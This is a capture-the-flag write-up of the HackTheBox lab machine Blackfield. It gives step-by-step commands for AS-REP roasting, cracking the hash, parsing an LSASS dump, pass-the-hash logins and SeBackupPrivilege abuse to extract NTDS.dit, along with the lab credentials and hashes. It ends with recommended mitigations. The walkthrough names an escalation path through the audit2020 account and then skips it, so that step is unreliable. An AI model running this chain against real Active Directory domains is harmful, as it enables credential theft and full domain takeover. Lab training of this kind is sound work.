---
title: 'Blackfield - HackTheBox'
description: 'Complete writeup of Blackfield, an Insane Windows machine from HackTheBox involving Active Directory, Kerberos, BloodHound, and advanced Windows privilege escalation techniques.'
pubDate: 2024-11-09
platform: 'htb'
category: 'machines'
difficulty: 'insane'
os: 'windows'
language: en
tags:
  [
    'active-directory',
    'kerberos',
    'bloodhound',
    'asreproast',
    'lsass',
    'sebackupprivilege',
    'ntds',
    'mimikatz',
  ]
retired: true
logo: '/images/writeups/htb/blackfield/logo.png'
heroImage: '/images/writeups/htb/blackfield/card.png'
attackVectors: ['network', 'active-directory', 'privilege-escalation']
techniques:
  [
    'T1558.003',
    'T1003.001',
    'T1003.003',
    'T1087.002',
    'T1069.002',
    'T1078.002',
    'T1003.002',
    'T1069.001',
    'T1082',
    'T1059.001',
  ]
vulnerabilities:
  [
    'AS-REP Roasting',
    'Weak-Credentials',
    'SeBackupPrivilege-Abuse',
    'LSASS-Dump',
  ]
certifications: ['OSCP', 'OSEP', 'CRTP']
skillLevel: 'expert'
estimatedTime: '4-6 hours'
points: 50
rating: 4.8
---

# Blackfield - HackTheBox Writeup

**Difficulty**: Insane
**OS**: Windows
**Platform**: HackTheBox
**IP**: 10.10.10.192

## Introduction

Blackfield is an Insane difficulty Windows machine that simulates a complete enterprise Active Directory environment. This machine requires advanced knowledge of Windows, Active Directory, Kerberos, and post-exploitation techniques. The path to complete compromise involves exhaustive enumeration, AS-REP Roasting, SeBackupPrivilege abuse, LSASS dumping, and NTDS.dit secret extraction.

## Reconnaissance

### Full port scan

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.192 -oG allPorts
```

**Open ports:**

```
53/tcp    - DNS
88/tcp    - Kerberos
135/tcp   - RPC
139/tcp   - NetBIOS
389/tcp   - LDAP
445/tcp   - SMB
593/tcp   - RPC over HTTP
3268/tcp  - Global Catalog
5985/tcp  - WinRM
```

### Detailed service scan

```bash
nmap -p53,88,135,139,389,445,593,3268,5985 -sCV 10.10.10.192 -oN targeted
```

**Important results:**

```
53/tcp    - Simple DNS Plus
88/tcp    - Kerberos (BLACKFIELD.local)
135/tcp   - RPC
389/tcp   - LDAP
445/tcp   - SMB (Windows Server 2019)
5985/tcp  - WinRM
Domain: BLACKFIELD.local
Hostname: DC01.BLACKFIELD.local
```

### DNS Enumeration

We add the domain to `/etc/hosts`:

```bash
echo "10.10.10.192 blackfield.local dc01.blackfield.local" | sudo tee -a /etc/hosts
```

Attempt DNS zone transfer:

```bash
dig axfr @10.10.10.192 blackfield.local
```

Zone transfer not allowed.

## SMB Enumeration

### Share listing (null session)

```bash
smbclient -N -L //10.10.10.192
```

**Available shares:**

```
ADMIN$          NO ACCESS
C$              NO ACCESS
forensic        NO ACCESS
IPC$            READ ONLY
NETLOGON        NO ACCESS
profiles$       READ ONLY
SYSVOL          NO ACCESS
```

### profiles$ share enumeration

```bash
smbclient -N //10.10.10.192/profiles$
```

Inside we find multiple user folders. List them all:

```bash
smbclient -N //10.10.10.192/profiles$ -c "ls"
```

Extract potential user list:

```bash
smbclient -N //10.10.10.192/profiles$ -c "ls" | awk '{print $1}' > users.txt
```

**Identified users:**

```
AAlleni
ABarteski
ABekesz
ABenzies
ACarpenter
...
support
svc_backup
audit2020
```

## Kerberos Attack - AS-REP Roasting

### Enumeration of users without Kerberos Pre-Authentication

We use **GetNPUsers.py** from Impacket to identify users vulnerable to AS-REP Roasting:

```bash
impacket-GetNPUsers blackfield.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.192
```

**Vulnerable user found:**

```
support@BLACKFIELD.LOCAL
```

### AS-REP hash captured

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:a8f3c2d1e4b5a6c7d8e9f0a1b2c3d4e5$...
```

### Hash cracking with Hashcat

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Credentials obtained:**

```
Username: support
Password: #00^BlackKnight
```

## Enumeration with valid credentials

### Credential validation

```bash
crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'
```

✅ Valid credentials but **not local administrator**.

### LDAP enumeration with BloodHound

Collect Active Directory data with BloodHound:

```bash
bloodhound-python -d blackfield.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c All
```

**Generated files:**

```
computers.json
domains.json
groups.json
users.json
```

### BloodHound Analysis

Import data into BloodHound and analyze:

1. **User support** is member of **Remote Management Users**
2. User **audit2020** has permissions over sensitive objects
3. Escalation path identified: `support → audit2020 → svc_backup → Administrator`

### SMB enumeration with credentials

```bash
smbclient -U 'support%#00^BlackKnight' //10.10.10.192/forensic
```

The `forensic` share is now accessible and contains:

```
memory_analysis/
commands_output/
tools/
```

Download the `lsass.zip` file:

```bash
smbclient -U 'support%#00^BlackKnight' //10.10.10.192/forensic -c "cd memory_analysis; get lsass.zip"
```

## LSASS dump analysis

### Dump extraction

```bash
unzip lsass.zip
```

We get `lsass.DMP`.

### Analysis with pypykatz

```bash
pypykatz lsa minidump lsass.DMP > lsass_secrets.txt
```

**Credentials found:**

```
Username: svc_backup
Domain: BLACKFIELD
NT Hash: 9658d1d1dcd9250115e2205d9f48400d
```

### Pass-the-Hash with svc_backup

```bash
crackmapexec smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

✅ User **svc_backup** has privileges.

### WinRM with evil-winrm

```bash
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

✅ Access obtained as **svc_backup**.

## Privilege Escalation

### Privilege enumeration

```powershell
whoami /priv
```

**Critical privilege identified:**

```
SeBackupPrivilege    ENABLED
SeRestorePrivilege   ENABLED
```

### SeBackupPrivilege abuse

With **SeBackupPrivilege** we can read any system file, including SAM registry and NTDS.dit.

### Method 1: Registry dump

```powershell
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
```

Download the files:

```bash
download C:\temp\sam.hive sam.hive
download C:\temp\system.hive system.hive
```

Extract hashes with secretsdump:

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

### Method 2: NTDS.dit extraction (More complete)

Create a DSInternals script to extract NTDS.dit:

```powershell
# Import-Module
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Enable privileges
Set-SeBackupPrivilege

# Copy NTDS.dit
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# Copy SYSTEM hive
reg save HKLM\SYSTEM C:\temp\system.hive
```

Download the files:

```bash
download C:\temp\ntds.dit ntds.dit
download C:\temp\system.hive system.hive
```

### Hash extraction with secretsdump

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

**Administrator hash obtained:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

## Full Compromise

### Pass-the-Hash as Administrator

```bash
evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

✅ **Full access as Administrator**

### Flags

```powershell
# User flag
type C:\Users\support\Desktop\user.txt

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

## MITRE ATT&CK Techniques

| ID        | Technique                    | Description                                        |
| --------- | ---------------------------- | -------------------------------------------------- |
| T1558.003 | AS-REP Roasting              | Obtaining Kerberos hash without pre-authentication |
| T1003.001 | LSASS Memory                 | Credential dumping from LSASS                      |
| T1003.003 | NTDS                         | Active Directory database extraction               |
| T1087.002 | Domain Account Enumeration   | Domain account enumeration                         |
| T1069.002 | Domain Groups                | Domain group enumeration                           |
| T1078.002 | Domain Accounts              | Using valid domain accounts                        |
| T1003.002 | Security Account Manager     | SAM registry dumping                               |
| T1069.001 | Local Groups                 | Local group enumeration                            |
| T1082     | System Information Discovery | System reconnaissance                              |
| T1059.001 | PowerShell                   | PowerShell execution                               |

## Tools Used

- **nmap** - Port and service scanning
- **smbclient** - SMB enumeration
- **Impacket** - GetNPUsers, secretsdump
- **Hashcat** - Hash cracking
- **BloodHound** - Active Directory analysis
- **pypykatz** - LSASS dump analysis
- **evil-winrm** - WinRM access
- **crackmapexec** - Credential validation

## Lessons Learned

### Identified Vulnerabilities

1. **SMB exposure with null session** - Allowed user enumeration
2. **AS-REP Roasting** - User without Kerberos pre-authentication
3. **Weak password** - Support user with crackable password
4. **Exposed LSASS dump** - Credentials in SMB share
5. **Misconfigured SeBackupPrivilege** - Allowed NTDS extraction

### Recommended Mitigations

1. **Disable null sessions on SMB**

   ```
   [HKLM\SYSTEM\CurrentControlSet\Control\Lsa]
   RestrictAnonymous = 2
   ```

2. **Enable Kerberos Pre-Authentication** for all users

3. **Strong password policy**
   - Minimum 14 characters
   - Mandatory complexity
   - Rotation every 90 days

4. **LSASS protection**
   - Enable Credential Guard
   - Protected Process Light (PPL)
   - Disable WDigest

5. **Privilege segregation**
   - Limit SeBackupPrivilege to necessary service accounts only
   - Implement Tiering Model
   - Use LAPS for local administrator passwords

6. **Monitoring and detection**
   - Alerts on SeBackupPrivilege use
   - AS-REP Roasting detection
   - NTDS.dit access monitoring

## Final Reflection

Blackfield is an excellent representation of a real Active Directory environment with multiple chained attack vectors. The machine teaches the importance of:

- **Exhaustive enumeration** at each stage
- **BloodHound analysis** to identify escalation paths
- **Deep understanding** of Windows privileges
- **Knowledge of post-exploitation techniques** in AD

This machine is highly recommended for certification preparation such as OSCP, OSEP, and CRTP, as it covers real techniques used in enterprise penetration testing.

## References

- [HackTheBox - Blackfield](https://app.hackthebox.com/machines/Blackfield)
- [AS-REP Roasting - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [SeBackupPrivilege Abuse](https://github.com/giuliano108/SeBackupPrivilege)
- [NTDS.dit Extraction](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)

---

**Tags**: #HackTheBox #Windows #Insane #ActiveDirectory #Kerberos #ASREPRoasting #LSASS #SeBackupPrivilege #NTDS #OSCP #OSEP
